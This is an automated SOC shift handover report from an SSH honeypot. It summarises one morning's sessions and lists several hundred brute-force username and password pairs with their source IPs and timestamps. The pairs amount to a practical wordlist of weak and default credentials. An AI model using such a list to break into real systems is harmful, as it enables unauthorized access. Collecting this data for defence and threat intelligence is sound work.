# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-19 |
| **Generated At** | 2026-07-19T11:12:25Z |
| **Shift Time** | 11:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **497** |
| Confirmed Threats | **480** |
| False Positives Filtered | **17** (3.4%) |
| Unique Attacker IPs | **84** |
| Countries of Origin | **22** |
| High Severity Cases | **413** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **84** |
| Malware Samples Analyzed | **2** HIGH · **33** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **438** |
| Unique Credential Pairs | **384** |
| Unique Usernames | **161** |
| Unique Passwords | **235** |
| Successful Auth Pairs | **425** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 87 |
| `admin` | 19 |
| `user` | 16 |
| `ubnt` | 15 |
| `deploy` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 21 |
| `123` | 16 |
| `1234` | 13 |
| `1` | 12 |
| `root` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `operator` | `operator2010` | 6 |
| `user` | `1234567890` | 6 |
| `admin` | `admin` | 6 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `support` | `support` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `guest` | `guest2022` | `65.20.174.49` | 2026-07-19T08:56:27 |
| `guest` | `guest2022` | `219.248.65.30` | 2026-07-19T08:59:37 |
| `guest` | `guest2022` | `85.105.2.51` | 2026-07-19T08:59:49 |
| `root` | `Abc123456789*` | `42.200.66.164` | 2026-07-19T09:01:21 |
| `345gs5662d34` | `345gs5662d34` | `42.200.66.164` | 2026-07-19T09:01:24 |
| `root` | `3245gs5662d34` | `42.200.66.164` | 2026-07-19T09:01:26 |
| `root` | `Lx123456` | `93.183.70.18` | 2026-07-19T09:01:28 |
| `345gs5662d34` | `345gs5662d34` | `93.183.70.18` | 2026-07-19T09:01:31 |
| `root` | `3245gs5662d34` | `93.183.70.18` | 2026-07-19T09:01:32 |
| `support` | `support` | `176.53.159.196` | 2026-07-19T09:06:07 |
| `ubnt` | `asdfgh` | `65.20.237.191` | 2026-07-19T09:06:46 |
| `root` | `a123456` | `203.110.233.225` | 2026-07-19T09:07:01 |
| `root` | `a123456` | `112.31.93.229` | 2026-07-19T09:07:16 |
| `support` | `support` | `10.0.0.73` | 2026-07-19T09:07:25 |
| `root` | `1234567a` | `185.242.3.195` | 2026-07-19T09:14:28 |
| `operator` | `operator2010` | `130.185.101.86` | 2026-07-19T09:20:34 |
| `operator` | `operator2010` | `180.188.253.150` | 2026-07-19T09:20:45 |
| `operator` | `operator2010` | `200.159.14.187` | 2026-07-19T09:23:34 |
| `operator` | `operator2010` | `154.146.238.122` | 2026-07-19T09:23:45 |
| `operator` | `operator2010` | `10.0.0.73` | 2026-07-19T09:24:01 |
| `debian` | `toor` | `211.247.127.250` | 2026-07-19T09:28:05 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-19T09:30:42 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-19T09:30:43 |
| `debian` | `toor` | `10.0.0.73` | 2026-07-19T09:31:57 |
| `user` | `1234567890` | `41.214.10.178` | 2026-07-19T09:32:07 |
| `user` | `1234567890` | `112.161.26.125` | 2026-07-19T09:32:16 |
| `user` | `1234567890` | `194.85.69.22` | 2026-07-19T09:35:19 |
| `user` | `1234567890` | `92.62.74.41` | 2026-07-19T09:35:26 |
| `user` | `1234567890` | `10.0.0.73` | 2026-07-19T09:35:54 |
| `ubnt` | `dietpi` | `165.227.129.203` | 2026-07-19T09:38:16 |
| `ubnt` | `dietpi` | `51.116.117.203` | 2026-07-19T09:38:22 |
| `root` | `1234567a` | `10.0.0.73` | 2026-07-19T09:38:44 |
| `ubnt` | `dietpi` | `117.211.15.106` | 2026-07-19T09:41:36 |
| `ubnt` | `dietpi` | `112.6.11.184` | 2026-07-19T09:41:45 |
| `user` | `root` | `91.92.42.19` | 2026-07-19T09:42:10 |
| `wso2` | `wso2` | `91.92.42.19` | 2026-07-19T09:42:29 |
| `dmdba` | `dmdba123456` | `91.92.42.19` | 2026-07-19T09:42:46 |
| `test` | `123456` | `91.92.42.19` | 2026-07-19T09:42:58 |
| `onkar` | `onkar123` | `91.92.42.19` | 2026-07-19T09:43:12 |
| `root` | `kali` | `91.92.42.19` | 2026-07-19T09:43:26 |
| `root` | `CatCult2025!` | `91.92.42.19` | 2026-07-19T09:43:43 |
| `config` | `123qwe` | `59.46.182.10` | 2026-07-19T09:43:48 |
| `trader` | `trader` | `91.92.42.19` | 2026-07-19T09:43:53 |
| `mysql` | `mysql123` | `91.92.42.19` | 2026-07-19T09:44:03 |
| `deploy` | `123` | `91.92.42.19` | 2026-07-19T09:44:13 |
| `deployer` | `deployer123` | `91.92.42.19` | 2026-07-19T09:44:22 |
| `root` | `dxfUgwfiNcx8` | `91.92.42.19` | 2026-07-19T09:44:31 |
| `root` | `pass` | `91.92.42.19` | 2026-07-19T09:44:39 |
| `nginx` | `toor` | `91.92.42.19` | 2026-07-19T09:44:55 |
| `master` | `qwerty` | `91.92.42.19` | 2026-07-19T09:44:58 |
| `user1` | `123456789` | `91.92.42.19` | 2026-07-19T09:45:09 |
| `home` | `root` | `91.92.42.19` | 2026-07-19T09:45:22 |
| `gpadmin` | `gpadmin` | `91.92.42.19` | 2026-07-19T09:45:26 |
| `admin` | `admin` | `185.65.202.199` | 2026-07-19T09:45:47 |
| `devops` | `1234` | `91.92.42.19` | 2026-07-19T09:45:55 |
| `monitor` | `monitor` | `91.92.42.19` | 2026-07-19T09:46:03 |
| `root` | `test123` | `91.92.42.19` | 2026-07-19T09:46:08 |
| `root` | `Admin@123` | `91.92.42.19` | 2026-07-19T09:46:15 |
| `root` | `P@ssw0rd123` | `91.92.42.19` | 2026-07-19T09:46:19 |
| `ts3` | `teamspeak` | `91.92.42.19` | 2026-07-19T09:46:28 |
| `developer` | `developer` | `91.92.42.19` | 2026-07-19T09:46:40 |
| `node` | `1qaz2wsx` | `91.92.42.19` | 2026-07-19T09:46:49 |
| `operator` | `operator2026` | `91.92.42.19` | 2026-07-19T09:47:05 |
| `mc` | `mc` | `91.92.42.19` | 2026-07-19T09:47:09 |
| `user` | `1234` | `91.92.42.19` | 2026-07-19T09:47:21 |
| `config` | `123qwe` | `10.0.0.73` | 2026-07-19T09:47:25 |
| `rancher` | `rancher123` | `91.92.42.19` | 2026-07-19T09:47:33 |
| `steam` | `123` | `91.92.42.19` | 2026-07-19T09:47:43 |
| `jack` | `jack` | `91.92.42.19` | 2026-07-19T09:47:54 |
| `root` | `linux` | `91.92.42.19` | 2026-07-19T09:48:08 |
| `student` | `student` | `91.92.42.19` | 2026-07-19T09:48:21 |
| `root` | `Aa123123` | `91.92.42.19` | 2026-07-19T09:48:39 |
| `root` | `nD6ffS9msOngs` | `91.92.42.19` | 2026-07-19T09:48:51 |
| `ubuntu` | `root` | `91.92.42.19` | 2026-07-19T09:49:03 |
| `user` | `1111` | `91.92.42.19` | 2026-07-19T09:49:20 |
| `user` | `12345` | `91.92.42.19` | 2026-07-19T09:49:32 |
| `root` | `1qazxsw2` | `91.92.42.19` | 2026-07-19T09:49:44 |
| `ts` | `ts` | `91.92.42.19` | 2026-07-19T09:49:55 |
| `testuser` | `testuser` | `91.92.42.19` | 2026-07-19T09:50:10 |
| `admin` | `admin123` | `91.92.42.19` | 2026-07-19T09:50:20 |
| `root` | `1q2w3e4r5t6y` | `91.92.42.19` | 2026-07-19T09:50:35 |
| `avax` | `avax` | `91.92.42.19` | 2026-07-19T09:50:50 |
| `ai` | `Aa123456` | `91.92.42.19` | 2026-07-19T09:50:59 |
| `runner` | `123` | `91.92.42.19` | 2026-07-19T09:51:15 |
| `nexus` | `nexus` | `91.92.42.19` | 2026-07-19T09:51:32 |
| `fastuser` | `12345678` | `91.92.42.19` | 2026-07-19T09:51:46 |
| `root` | `123` | `91.92.42.19` | 2026-07-19T09:51:57 |
| `azureuser` | `root` | `91.92.42.19` | 2026-07-19T09:52:14 |
| `ubuntu` | `12345678` | `91.92.42.19` | 2026-07-19T09:52:26 |
| `root` | `qwe123456` | `91.92.42.19` | 2026-07-19T09:52:37 |
| `usuario` | `usuario` | `91.92.42.19` | 2026-07-19T09:52:42 |
| `ghost` | `ghost` | `91.92.42.19` | 2026-07-19T09:52:51 |
| `root` | `qwe123` | `91.92.42.19` | 2026-07-19T09:53:02 |
| `pi` | `raspberry` | `91.92.42.19` | 2026-07-19T09:53:09 |
| `root` | `123qwe!@` | `91.92.42.19` | 2026-07-19T09:53:16 |
| `oracle` | `oracle` | `91.92.42.19` | 2026-07-19T09:53:25 |
| `core` | `1qaz2wsx` | `91.92.42.19` | 2026-07-19T09:53:33 |
| `sftpuser` | `sftpuser` | `91.92.42.19` | 2026-07-19T09:53:41 |
| `worker` | `worker` | `91.92.42.19` | 2026-07-19T09:53:50 |
| `www` | `123321` | `91.92.42.19` | 2026-07-19T09:53:57 |
| `app` | `rootroot` | `91.92.42.19` | 2026-07-19T09:54:07 |
| `openclaw` | `user` | `91.92.42.19` | 2026-07-19T09:54:12 |
| `username` | `username` | `91.92.42.19` | 2026-07-19T09:54:20 |
| `user1` | `user1` | `91.92.42.19` | 2026-07-19T09:54:27 |
| `fastuser` | `123456789` | `91.92.42.19` | 2026-07-19T09:54:34 |
| `steam` | `1` | `91.92.42.19` | 2026-07-19T09:54:42 |
| `root` | `aA123456` | `91.92.42.19` | 2026-07-19T09:54:53 |
| `ubuntu` | `1qaz@WSX` | `91.92.42.19` | 2026-07-19T09:55:03 |
| `deploy` | `1` | `91.92.42.19` | 2026-07-19T09:55:13 |
| `jenkins` | `jenkins` | `91.92.42.19` | 2026-07-19T09:55:22 |
| `ftpuser` | `123456` | `91.92.42.19` | 2026-07-19T09:55:32 |
| `main` | `1234` | `91.92.42.19` | 2026-07-19T09:55:40 |
| `claude` | `12345678` | `91.92.42.19` | 2026-07-19T09:55:49 |
| `rocky` | `1` | `91.92.42.19` | 2026-07-19T09:55:59 |
| `root` | `aB123456` | `91.92.42.19` | 2026-07-19T09:56:08 |
| `claude` | `1234` | `91.92.42.19` | 2026-07-19T09:56:16 |
| `hduser` | `hduser` | `91.92.42.19` | 2026-07-19T09:56:23 |
| `deploy` | `dev` | `91.92.42.19` | 2026-07-19T09:56:33 |
| `operator` | `999999` | `87.225.108.138` | 2026-07-19T09:56:34 |
| `root` | `12qwaszx` | `91.92.42.19` | 2026-07-19T09:56:43 |
| `deploy` | `qwerty123` | `91.92.42.19` | 2026-07-19T09:56:54 |
| `fahmi` | `fahmi` | `91.92.42.19` | 2026-07-19T09:57:05 |
| `vncuser` | `vncuser` | `91.92.42.19` | 2026-07-19T09:57:14 |
| `root` | `1234` | `91.92.42.19` | 2026-07-19T09:57:26 |
| `ftpuser1` | `123456` | `91.92.42.19` | 2026-07-19T09:57:40 |
| `amit` | `amit` | `91.92.42.19` | 2026-07-19T09:57:52 |
| `steam` | `steam` | `91.92.42.19` | 2026-07-19T09:58:01 |
| `root` | `nimda` | `91.92.42.19` | 2026-07-19T09:58:16 |
| `newuser` | `123` | `91.92.42.19` | 2026-07-19T09:58:26 |
| `root` | `Huawei@123` | `91.92.42.19` | 2026-07-19T09:58:40 |
| `deploy` | `deploy123` | `91.92.42.19` | 2026-07-19T09:58:47 |
| `root` | `root@2026` | `91.92.42.19` | 2026-07-19T09:58:57 |
| `admin` | `123456789` | `91.92.42.19` | 2026-07-19T09:59:08 |
| `odoo14` | `odoo14` | `91.92.42.19` | 2026-07-19T09:59:21 |
| `root` | `qwerty` | `91.92.42.19` | 2026-07-19T09:59:32 |
| `root` | `Abc123456` | `91.92.42.19` | 2026-07-19T09:59:42 |
| `root` | `abcd@1234` | `91.92.42.19` | 2026-07-19T09:59:51 |
| `john` | `123456` | `91.92.42.19` | 2026-07-19T10:00:01 |
| `rock` | `rock` | `91.92.42.19` | 2026-07-19T10:00:13 |
| `dmdba` | `dmdba` | `91.92.42.19` | 2026-07-19T10:00:29 |
| `ubnt` | `123123` | `10.0.0.73` | 2026-07-19T10:00:40 |
| `appuser` | `12345` | `91.92.42.19` | 2026-07-19T10:00:40 |
| `root` | `t0talc0ntr0l4!` | `91.92.42.19` | 2026-07-19T10:00:54 |
| `root` | `mortimer` | `209.99.189.177` | 2026-07-19T10:01:05 |
| `test` | `test@123` | `91.92.42.19` | 2026-07-19T10:01:06 |
| `345gs5662d34` | `345gs5662d34` | `209.99.189.177` | 2026-07-19T10:01:07 |
| `root` | `3245gs5662d34` | `209.99.189.177` | 2026-07-19T10:01:08 |
| `root` | `Aa123321` | `91.92.42.19` | 2026-07-19T10:01:18 |
| `work` | `work` | `91.92.42.19` | 2026-07-19T10:01:28 |
| `guest` | `abc123` | `91.92.42.19` | 2026-07-19T10:01:38 |
| `jenkins` | `1234` | `91.92.42.19` | 2026-07-19T10:01:53 |
| `deploy` | `rootroot` | `91.92.42.19` | 2026-07-19T10:02:12 |
| `root` | `1qaz` | `23.88.50.193` | 2026-07-19T10:02:14 |
| `345gs5662d34` | `345gs5662d34` | `23.88.50.193` | 2026-07-19T10:02:16 |
| `root` | `3245gs5662d34` | `23.88.50.193` | 2026-07-19T10:02:18 |
| `ubuntu` | `rootroot` | `91.92.42.19` | 2026-07-19T10:02:19 |
| `dev` | `111111` | `91.92.42.19` | 2026-07-19T10:02:29 |
| `user` | `1qaz@WSX` | `91.92.42.19` | 2026-07-19T10:02:43 |
| `user` | `111` | `91.92.42.19` | 2026-07-19T10:02:57 |
| `potok` | `potok` | `91.92.42.19` | 2026-07-19T10:03:11 |
| `blank` | `654321` | `182.75.197.174` | 2026-07-19T10:03:14 |
| `stack` | `stack` | `91.92.42.19` | 2026-07-19T10:03:26 |
| `user` | `111111` | `91.92.42.19` | 2026-07-19T10:03:39 |
| `admin1` | `123456` | `91.92.42.19` | 2026-07-19T10:03:52 |
| `milad` | `milad123` | `91.92.42.19` | 2026-07-19T10:04:03 |
| `root` | `admin123` | `91.92.42.19` | 2026-07-19T10:04:15 |
| `root` | `p@ssw0rd` | `91.92.42.19` | 2026-07-19T10:04:30 |
| `postgres` | `password` | `91.92.42.19` | 2026-07-19T10:04:44 |
| `root` | `1qaz@wsx` | `91.92.42.19` | 2026-07-19T10:04:55 |
| `vncuser` | `123456` | `91.92.42.19` | 2026-07-19T10:05:10 |
| `test10` | `test10` | `185.242.3.195` | 2026-07-19T10:05:18 |
| `asterisk` | `asterisk` | `91.92.42.19` | 2026-07-19T10:05:21 |
| `admin` | `Admin@123` | `91.92.42.19` | 2026-07-19T10:05:35 |
| `test` | `1` | `91.92.42.19` | 2026-07-19T10:05:51 |
| `test1` | `123456789` | `91.92.42.19` | 2026-07-19T10:06:00 |
| `test1` | `test123` | `91.92.42.19` | 2026-07-19T10:06:13 |
| `root` | `1029384756` | `91.92.42.19` | 2026-07-19T10:06:26 |
| `admin` | `1` | `91.92.42.19` | 2026-07-19T10:06:44 |
| `blank` | `654321` | `10.0.0.73` | 2026-07-19T10:06:54 |
| `tester` | `password` | `91.92.42.19` | 2026-07-19T10:06:55 |
| `root` | `zaq12wsx` | `91.92.42.19` | 2026-07-19T10:07:10 |
| `fastuser` | `fastuser` | `91.92.42.19` | 2026-07-19T10:07:21 |
| `ubnt` | `ubnt2014` | `111.171.127.190` | 2026-07-19T10:07:29 |
| `odoo` | `123` | `91.92.42.19` | 2026-07-19T10:07:30 |
| `ubnt` | `ubnt2014` | `125.20.207.154` | 2026-07-19T10:07:38 |
| `openclaw` | `1` | `91.92.42.19` | 2026-07-19T10:07:41 |
| `pi` | `12345678` | `91.92.42.19` | 2026-07-19T10:07:54 |
| `developer` | `123` | `91.92.42.19` | 2026-07-19T10:08:04 |
| `root` | `A123456a` | `91.92.42.19` | 2026-07-19T10:08:21 |
| `ubuntu` | `password` | `91.92.42.19` | 2026-07-19T10:08:34 |
| `app` | `app` | `91.92.42.19` | 2026-07-19T10:08:50 |
| `root1` | `1` | `91.92.42.19` | 2026-07-19T10:09:02 |
| `alex` | `1234` | `91.92.42.19` | 2026-07-19T10:09:17 |
| `user` | `147258` | `161.35.34.21` | 2026-07-19T10:09:27 |
| `nobody` | `nobody` | `91.92.42.19` | 2026-07-19T10:09:29 |
| `345gs5662d34` | `345gs5662d34` | `161.35.34.21` | 2026-07-19T10:09:30 |
| `user` | `3245gs5662d34` | `161.35.34.21` | 2026-07-19T10:09:30 |
| `root` | `momo123` | `91.92.42.19` | 2026-07-19T10:09:34 |
| `root` | `1qaz@WSX` | `91.92.42.19` | 2026-07-19T10:09:53 |
| `cloud-user` | `password` | `91.92.42.19` | 2026-07-19T10:10:13 |
| `gd` | `gd` | `91.92.42.19` | 2026-07-19T10:10:19 |
| `deployer` | `deployer` | `91.92.42.19` | 2026-07-19T10:10:32 |
| `rdpuser` | `rdpuser` | `91.92.42.19` | 2026-07-19T10:10:41 |
| `fivem` | `password` | `91.92.42.19` | 2026-07-19T10:10:53 |
| `kali` | `kali` | `91.92.42.19` | 2026-07-19T10:11:04 |
| `ubnt` | `ubnt2014` | `176.170.1.244` | 2026-07-19T10:11:05 |
| `ubnt` | `ubnt2014` | `220.78.179.108` | 2026-07-19T10:11:17 |
| `appuser` | `password` | `91.92.42.19` | 2026-07-19T10:11:21 |
| `ubnt` | `ubnt2014` | `10.0.0.73` | 2026-07-19T10:11:25 |
| `user` | `git` | `91.92.42.19` | 2026-07-19T10:11:31 |
| `root` | `102030` | `91.92.42.19` | 2026-07-19T10:11:48 |
| `root` | `123@@@` | `91.92.42.19` | 2026-07-19T10:12:00 |
| `openvpn` | `12345678` | `91.92.42.19` | 2026-07-19T10:12:15 |
| `root` | `P@ssw0rd` | `91.92.42.19` | 2026-07-19T10:12:24 |
| `root` | `nPSpP4PBW0` | `91.92.42.19` | 2026-07-19T10:12:40 |
| `sam` | `abc123` | `91.92.42.19` | 2026-07-19T10:12:50 |
| `root` | `28011988` | `91.92.42.19` | 2026-07-19T10:13:03 |
| `test` | `test` | `91.92.42.19` | 2026-07-19T10:13:14 |
| `deploy` | `123456789` | `91.92.42.19` | 2026-07-19T10:13:25 |
| `admin` | `1234` | `91.92.42.19` | 2026-07-19T10:13:40 |
| `postgres` | `postgres123` | `91.92.42.19` | 2026-07-19T10:13:51 |
| `root` | `qQ123456` | `91.92.42.19` | 2026-07-19T10:14:07 |
| `claude` | `1` | `91.92.42.19` | 2026-07-19T10:14:19 |
| `guest` | `pi` | `91.92.42.19` | 2026-07-19T10:14:30 |
| `prem` | `12345` | `91.92.42.19` | 2026-07-19T10:14:44 |
| `ubuntu` | `Ubuntu123!` | `91.92.42.19` | 2026-07-19T10:15:00 |
| `admin` | `admin123!` | `91.92.42.19` | 2026-07-19T10:15:11 |
| `sonar` | `sonar` | `91.92.42.19` | 2026-07-19T10:15:24 |
| `test` | `qwerty123` | `91.92.42.19` | 2026-07-19T10:15:35 |
| `hadoop` | `hadoop` | `91.92.42.19` | 2026-07-19T10:15:51 |
| `pi` | `pi` | `91.92.42.19` | 2026-07-19T10:16:04 |
| `student` | `123456` | `91.92.42.19` | 2026-07-19T10:16:20 |
| `hadoop` | `hadoop123` | `91.92.42.19` | 2026-07-19T10:16:26 |
| `crafty` | `crafty` | `91.92.42.19` | 2026-07-19T10:16:45 |
| `parsa` | `parsa` | `91.92.42.19` | 2026-07-19T10:17:04 |
| `pi` | `1234` | `91.92.42.19` | 2026-07-19T10:17:08 |
| `adminuser` | `adminuser` | `91.92.42.19` | 2026-07-19T10:17:21 |
| `admin1` | `admin1` | `91.92.42.19` | 2026-07-19T10:17:31 |
| `bot` | `bot` | `91.92.42.19` | 2026-07-19T10:17:46 |
| `unknown` | `123321` | `220.80.221.68` | 2026-07-19T10:17:59 |
| `openclaw` | `123456` | `91.92.42.19` | 2026-07-19T10:18:03 |
| `clawdbot` | `clawdbot` | `91.92.42.19` | 2026-07-19T10:18:14 |
| `claude` | `password` | `91.92.42.19` | 2026-07-19T10:18:24 |
| `ai` | `toor` | `91.92.42.19` | 2026-07-19T10:18:37 |
| `oracle` | `oracle123` | `91.92.42.19` | 2026-07-19T10:18:51 |
| `git` | `1234` | `91.92.42.19` | 2026-07-19T10:19:05 |
| `user3` | `12345678` | `91.92.42.19` | 2026-07-19T10:19:21 |
| `nobody` | `1234` | `91.92.42.19` | 2026-07-19T10:19:33 |
| `root1` | `root1` | `91.92.42.19` | 2026-07-19T10:19:47 |
| `user1` | `123` | `91.92.42.19` | 2026-07-19T10:20:00 |
| `admin` | `admin` | `91.92.42.19` | 2026-07-19T10:20:10 |
| `steam` | `steam123` | `91.92.42.19` | 2026-07-19T10:20:24 |
| `term2` | `term2` | `91.92.42.19` | 2026-07-19T10:20:39 |
| `git` | `dev` | `91.92.42.19` | 2026-07-19T10:20:49 |
| `ansible` | `qwerty` | `91.92.42.19` | 2026-07-19T10:21:02 |
| `teamspeak` | `teamspeak` | `91.92.42.19` | 2026-07-19T10:21:13 |
| `root` | `Qwerty123` | `91.92.42.19` | 2026-07-19T10:21:27 |
| `root` | `abc123` | `91.92.42.19` | 2026-07-19T10:21:40 |
| `debian` | `p@ssword` | `81.237.155.113` | 2026-07-19T10:21:43 |
| `teamspeak` | `raspberry` | `91.92.42.19` | 2026-07-19T10:21:51 |
| `root` | `!Q2w3e4r` | `91.92.42.19` | 2026-07-19T10:22:05 |
| `zimbra` | `zimbra` | `91.92.42.19` | 2026-07-19T10:22:21 |
| `milad` | `milad` | `91.92.42.19` | 2026-07-19T10:22:36 |
| `admin123` | `1234` | `91.92.42.19` | 2026-07-19T10:22:49 |
| `teamspeak` | `123456` | `91.92.42.19` | 2026-07-19T10:23:02 |
| `root` | `11` | `91.92.42.19` | 2026-07-19T10:23:17 |
| `angel` | `angel` | `91.92.42.19` | 2026-07-19T10:23:30 |
| `minecraft` | `123123` | `91.92.42.19` | 2026-07-19T10:23:34 |
| `www` | `www` | `91.92.42.19` | 2026-07-19T10:23:47 |
| `root` | `p@ssword` | `91.92.42.19` | 2026-07-19T10:23:58 |
| `x` | `1` | `91.92.42.19` | 2026-07-19T10:24:14 |
| `core` | `P@ssw0rd` | `91.92.42.19` | 2026-07-19T10:24:23 |
| `root` | `asdfasdf-space` | `91.92.42.19` | 2026-07-19T10:24:35 |
| `root` | `Aa123456` | `91.92.42.19` | 2026-07-19T10:24:50 |
| `debian` | `p@ssword` | `45.178.227.0` | 2026-07-19T10:24:59 |
| `root` | `123123123` | `91.92.42.19` | 2026-07-19T10:25:03 |
| `debian` | `p@ssword` | `61.145.163.164` | 2026-07-19T10:25:08 |
| `vncuser` | `password` | `91.92.42.19` | 2026-07-19T10:25:17 |
| `root` | `Welcome123` | `91.92.42.19` | 2026-07-19T10:25:36 |
| `tactical` | `tactical` | `91.92.42.19` | 2026-07-19T10:25:48 |
| `nagios` | `nagios` | `91.92.42.19` | 2026-07-19T10:26:03 |
| `testuser` | `test` | `91.92.42.19` | 2026-07-19T10:26:14 |
| `root` | `P@ssword` | `91.92.42.19` | 2026-07-19T10:26:26 |
| `root` | `123abc456` | `91.92.42.19` | 2026-07-19T10:26:41 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-19T10:26:49 |
| `tester` | `12345` | `91.92.42.19` | 2026-07-19T10:26:53 |
| `root` | `ZAQ!2wsx` | `91.92.42.19` | 2026-07-19T10:27:02 |
| `bob` | `root` | `91.92.42.19` | 2026-07-19T10:27:21 |
| `mysql` | `mysql` | `91.92.42.19` | 2026-07-19T10:27:34 |
| `dev` | `dev` | `91.92.42.19` | 2026-07-19T10:27:48 |
| `jakob` | `jakob` | `91.92.42.19` | 2026-07-19T10:27:58 |
| `user1` | `12345` | `91.92.42.19` | 2026-07-19T10:28:07 |
| `frappe` | `admin` | `91.92.42.19` | 2026-07-19T10:28:23 |
| `root` | `Abcd1234` | `91.92.42.19` | 2026-07-19T10:28:36 |
| `ubuntu` | `P@ssw0rd` | `91.92.42.19` | 2026-07-19T10:28:54 |
| `karel` | `karel` | `91.92.42.19` | 2026-07-19T10:29:05 |
| `guest` | `guest` | `91.92.42.19` | 2026-07-19T10:29:14 |
| `root` | `1qaz2wsx` | `91.92.42.19` | 2026-07-19T10:29:23 |
| `test10` | `test10` | `10.0.0.73` | 2026-07-19T10:29:29 |
| `odoo` | `odoo` | `91.92.42.19` | 2026-07-19T10:29:39 |
| `ftpuser` | `p@ssw0rd` | `91.92.42.19` | 2026-07-19T10:29:53 |
| `test` | `passwd` | `91.92.42.19` | 2026-07-19T10:30:10 |
| `root` | `qq123456` | `91.92.42.19` | 2026-07-19T10:30:21 |
| `ftpuser` | `123456789` | `91.92.42.19` | 2026-07-19T10:30:35 |
| `dev` | `123456` | `91.92.42.19` | 2026-07-19T10:30:45 |
| `localhost` | `localhost` | `91.92.42.19` | 2026-07-19T10:31:01 |
| `root` | `password` | `91.92.42.19` | 2026-07-19T10:31:16 |
| `ubnt` | `qwerty12` | `112.161.26.125` | 2026-07-19T10:31:23 |
| `frappe` | `12345678` | `91.92.42.19` | 2026-07-19T10:31:26 |
| `test` | `test12345` | `118.43.235.198` | 2026-07-19T10:31:36 |
| `admin1` | `modzmodz` | `91.92.42.19` | 2026-07-19T10:31:38 |
| `ubnt` | `qwerty12` | `10.0.0.73` | 2026-07-19T10:31:41 |
| `media` | `rock` | `91.92.42.19` | 2026-07-19T10:31:57 |
| `webuser` | `123456` | `91.92.42.19` | 2026-07-19T10:32:07 |
| `admin` | `!QAZ2wsx` | `91.92.42.19` | 2026-07-19T10:32:25 |
| `system` | `1qaz2wsx` | `91.92.42.19` | 2026-07-19T10:32:38 |
| `claude` | `claude123` | `91.92.42.19` | 2026-07-19T10:32:45 |
| `root` | `passwd` | `91.92.42.19` | 2026-07-19T10:32:56 |
| `administrator` | `administrator` | `91.92.42.19` | 2026-07-19T10:33:14 |
| `alex` | `alex` | `91.92.42.19` | 2026-07-19T10:33:24 |
| `dev` | `123` | `91.92.42.19` | 2026-07-19T10:33:38 |
| `amir` | `amir` | `91.92.42.19` | 2026-07-19T10:33:53 |
| `support` | `support` | `91.92.42.19` | 2026-07-19T10:34:04 |
| `minecraft` | `password` | `91.92.42.19` | 2026-07-19T10:34:18 |
| `debian` | `qwerty` | `91.92.42.19` | 2026-07-19T10:34:36 |
| `test` | `test12345` | `183.223.156.154` | 2026-07-19T10:34:37 |
| `root` | `123321` | `91.92.42.19` | 2026-07-19T10:34:45 |
| `gitlab-runner` | `test` | `91.92.42.19` | 2026-07-19T10:34:59 |
| `test` | `test12345` | `10.0.0.73` | 2026-07-19T10:35:10 |
| `bitrix` | `bitrix` | `91.92.42.19` | 2026-07-19T10:35:10 |
| `root` | `huawei@123` | `91.92.42.19` | 2026-07-19T10:35:20 |
| `dspace` | `dspace` | `91.92.42.19` | 2026-07-19T10:35:35 |
| `user4` | `user4` | `91.92.42.19` | 2026-07-19T10:35:46 |
| `root` | `hello123` | `91.92.42.19` | 2026-07-19T10:36:02 |
| `fred` | `fred` | `91.92.42.19` | 2026-07-19T10:36:20 |
| `home` | `home` | `91.92.42.19` | 2026-07-19T10:36:31 |
| `student` | `redhat` | `91.92.42.19` | 2026-07-19T10:36:44 |
| `oscar` | `oscar` | `91.92.42.19` | 2026-07-19T10:36:58 |
| `deploy` | `toor` | `91.92.42.19` | 2026-07-19T10:37:09 |
| `root` | `abcd1234` | `91.92.42.19` | 2026-07-19T10:37:22 |
| `openvpn` | `openvpn` | `91.92.42.19` | 2026-07-19T10:37:33 |
| `root` | `qwe@123` | `91.92.42.19` | 2026-07-19T10:37:48 |
| `ts3` | `123` | `91.92.42.19` | 2026-07-19T10:38:00 |
| `prefect` | `prefect` | `91.92.42.19` | 2026-07-19T10:38:12 |
| `grok` | `12345678` | `91.92.42.19` | 2026-07-19T10:38:27 |
| `david` | `david` | `91.92.42.19` | 2026-07-19T10:38:44 |
| `git` | `123456` | `91.92.42.19` | 2026-07-19T10:39:00 |
| `gabriel` | `1q2w3e4r` | `91.92.42.19` | 2026-07-19T10:39:11 |
| `kim` | `kim123` | `91.92.42.19` | 2026-07-19T10:39:19 |
| `odoo18` | `odoo` | `91.92.42.19` | 2026-07-19T10:39:33 |
| `grid` | `grid` | `91.92.42.19` | 2026-07-19T10:39:47 |
| `pi` | `1` | `91.92.42.19` | 2026-07-19T10:40:01 |
| `jellyfin` | `123` | `91.92.42.19` | 2026-07-19T10:40:14 |
| `ubuntu` | `qwe123456` | `91.92.42.19` | 2026-07-19T10:40:33 |
| `docker` | `docker123` | `91.92.42.19` | 2026-07-19T10:40:41 |
| `runner` | `runner` | `91.92.42.19` | 2026-07-19T10:40:56 |
| `elasticsearch` | `elasticsearch@1234` | `91.92.42.19` | 2026-07-19T10:41:09 |
| `deploy` | `!Q2w3e4r` | `91.92.42.19` | 2026-07-19T10:41:27 |
| `minecraft` | `1` | `91.92.42.19` | 2026-07-19T10:41:33 |
| `admin2` | `abc123` | `91.92.42.19` | 2026-07-19T10:41:45 |
| `ubuntu` | `qwe123` | `91.92.42.19` | 2026-07-19T10:41:58 |
| `developer` | `root` | `91.92.42.19` | 2026-07-19T10:42:11 |
| `admin` | `111` | `91.92.42.19` | 2026-07-19T10:42:26 |
| `root` | `Root@123` | `91.92.42.19` | 2026-07-19T10:42:41 |
| `deploy` | `root` | `91.92.42.19` | 2026-07-19T10:42:54 |
